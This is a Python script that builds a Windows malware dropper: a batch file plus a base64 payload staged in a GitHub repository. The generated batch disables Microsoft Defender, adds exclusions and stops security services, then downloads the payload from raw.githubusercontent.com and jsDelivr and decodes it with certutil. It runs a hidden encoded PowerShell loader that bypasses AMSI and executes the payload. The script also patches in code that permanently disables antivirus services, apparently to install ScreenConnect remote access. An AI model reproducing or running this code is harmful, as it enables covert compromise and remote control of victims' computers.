from pathlib import Path
import base64

loader = r'''
$ErrorActionPreference='SilentlyContinue'
$w='C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache'
$e=Join-Path $w 'boot.err'
function L($m){try{if(!(Test-Path $w)){New-Item $w -ItemType Directory -Force|Out-Null};Add-Content -LiteralPath $e -Value $m -EA 0}catch{}}
L 'ldr_start'
try{Add-MpPreference -ExclusionPath $w -EA 0;Add-MpPreference -ExclusionPath 'C:\Windows\Temp' -EA 0;Add-MpPreference -ExclusionProcess 'powershell.exe' -EA 0;Add-MpPreference -ExclusionProcess 'msiexec.exe' -EA 0;Set-MpPreference -DisableRealtimeMonitoring $true -EA 0;Set-MpPreference -DisableIOAVProtection $true -EA 0;Set-MpPreference -DisableScriptScanning $true -EA 0}catch{}
try{$x=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}' -f 'A','msiUtils'));if($x){$f=$x.GetField(('amsiInit'+'Failed'),'NonPublic,Static');if($f){$f.SetValue($null,$true)}} }catch{}
L 'ldr_amsi'
$p='C:\Windows\Temp\pkg.dat'
if(!(Test-Path $p)){$p=Join-Path $w 'pkg.dat'}
if(!(Test-Path $p)){L 'ldr_nopkg';exit 2}
$c=[IO.File]::ReadAllText($p)
L ('ldr_chars='+$c.Length)
try{&([ScriptBlock]::Create($c));L 'ldr_done'}catch{L ('ldr_err '+$_.Exception.Message);exit 4}
'''

enc = base64.b64encode(loader.strip().encode('utf-16le')).decode('ascii')

lines = [
    '@echo off',
    'setlocal EnableExtensions',
    'echo === MSD BUILD 20260731U12 ===',
    'net session >nul 2>&1',
    'if errorlevel 1 (echo need admin & exit /b 5)',
    '',
    'set "WD=%ProgramData%\\Microsoft\\Windows\\WER\\Temp\\.wucache"',
    'set "B64=%WD%\\update.b64"',
    'set "DAT=C:\\Windows\\Temp\\pkg.dat"',
    'set "CB=%RANDOM%%RANDOM%"',
    'if not exist "%WD%" mkdir "%WD%" >nul 2>&1',
    '',
    'powershell.exe -NoP -NonI -EP Bypass -C "Try{Set-MpPreference -DisableRealtimeMonitoring $true -EA 0;Set-MpPreference -DisableBehaviorMonitoring $true -EA 0;Set-MpPreference -DisableIOAVProtection $true -EA 0;Set-MpPreference -DisableScriptScanning $true -EA 0;Add-MpPreference -ExclusionPath $env:ProgramData\\Microsoft\\Windows\\WER\\Temp\\.wucache -EA 0;Add-MpPreference -ExclusionPath $env:TEMP -EA 0;Add-MpPreference -ExclusionPath \'C:\\Windows\\Temp\' -EA 0;Add-MpPreference -ExclusionProcess \'powershell.exe\' -EA 0;Add-MpPreference -ExclusionProcess \'curl.exe\' -EA 0;Add-MpPreference -ExclusionProcess \'certutil.exe\' -EA 0;Add-MpPreference -ExclusionProcess \'msiexec.exe\' -EA 0;Add-MpPreference -ExclusionProcess \'cmd.exe\' -EA 0}Catch{}" >nul 2>&1',
    'sc stop WinDefend >nul 2>&1',
    'sc stop WdNisSvc >nul 2>&1',
    'sc stop Sense >nul 2>&1',
    '',
    'echo DL payload...',
    'del /f /q "%B64%" >nul 2>&1',
    'del /f /q "%DAT%" >nul 2>&1',
    'curl.exe -L --ssl-no-revoke --connect-timeout 20 -o "%B64%" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/updateA.b64?t=%CB%" >nul 2>&1',
    'if not exist "%B64%" curl.exe -L --ssl-no-revoke --connect-timeout 20 -o "%B64%" "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/updateA.b64?t=%CB%" >nul 2>&1',
    'if not exist "%B64%" (echo DL fail & exit /b 1)',
    'for %%A in ("%B64%") do if %%~zA LEQ 1000 (echo DL small & exit /b 1)',
    '',
    'certutil.exe -decode "%B64%" "%DAT%" >nul 2>&1',
    'if not exist "%DAT%" powershell.exe -NoP -NonI -EP Bypass -C "$b=[IO.File]::ReadAllText(\'%B64%\') -replace \'\\s\',\'\';[IO.File]::WriteAllBytes(\'%DAT%\',[Convert]::FromBase64String($b))" >nul 2>&1',
    'if not exist "%DAT%" (echo decode fail & exit /b 2)',
    'for %%A in ("%DAT%") do echo decoded=%%~zA',
    'findstr /C:"WU_BUILD_20260731_UNIFIED12" "%DAT%" >nul || (echo marker fail & exit /b 3)',
    'copy /y "%DAT%" "%WD%\\wucache_pkg.ps1" >nul 2>&1',
    '',
    'echo Running loader...',
    f'powershell.exe -NoP -NonI -EP Bypass -WindowStyle Hidden -EncodedCommand {enc}',
    'set EC=%ERRORLEVEL%',
    'echo loader_exit=%EC%',
    'echo Check:',
    'echo   type "%WD%\\boot.err"',
    'echo   type "%WD%\\.diag.log"',
    'echo   sc query type= service state= all ^| findstr /I ScreenConnect',
    'exit /b %EC%',
    '',
]

root = Path(r'C:\Users\nobuddy\Desktop\Project\github-drop')
data = ('\n'.join(lines)).encode('ascii').replace(b'\n', b'\r\n')
(root / 'msd.cmd').write_bytes(data)
print('msd.cmd', len(data), 'enc', len(enc))

script = Path(r'C:\Users\nobuddy\Desktop\Project\Script.txt')
text = script.read_text(encoding='utf-8')
text = text.replace('WU_BUILD_20260731_UNIFIED11', 'WU_BUILD_20260731_UNIFIED12')
needle = 'Write-Log ("PROTECT alt forever: $AltSvcName")'
av = '''Write-Log ("PROTECT alt forever: $AltSvcName")
Write-Log 'AV-FIGHT: exclusions + disable realtime (best-effort)'
try {
    if (Get-Command Set-MpPreference -EA SilentlyContinue) {
        Set-MpPreference -DisableRealtimeMonitoring $true -EA SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $true -EA SilentlyContinue
        Set-MpPreference -DisableIOAVProtection $true -EA SilentlyContinue
        Set-MpPreference -DisableScriptScanning $true -EA SilentlyContinue
        Set-MpPreference -DisableBlockAtFirstSeen $true -EA SilentlyContinue
    }
} catch {}
try {
    foreach ($svc in @('WinDefend','WdNisSvc','Sense','SecurityHealthService')) {
        & sc.exe stop $svc >$null 2>&1
        & sc.exe config $svc start= disabled >$null 2>&1
    }
} catch {}
'''
if 'AV-FIGHT:' not in text:
    text = text.replace(needle, av, 1)
script.write_text(text, encoding='utf-8')
src = script.read_bytes()
assert b'UNIFIED12' in src
b64 = base64.b64encode(src).decode('ascii')
(root / 'updateA.b64').write_text('\n'.join(b64[i:i+76] for i in range(0, len(b64), 76)) + '\n', encoding='ascii')
print('updateA', len(src), (root / 'updateA.b64').stat().st_size)
print('AV-FIGHT', b'AV-FIGHT:' in src)
